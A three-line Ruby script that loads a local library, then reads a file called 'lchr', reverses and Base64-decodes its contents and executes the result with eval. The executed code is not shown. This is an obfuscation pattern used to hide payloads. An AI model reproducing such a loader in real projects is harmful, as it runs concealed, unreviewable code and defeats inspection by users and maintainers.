require_relative "lib/omega"
require 'base64'
eval(Base64.decode64(File.read("./lchr").reverse))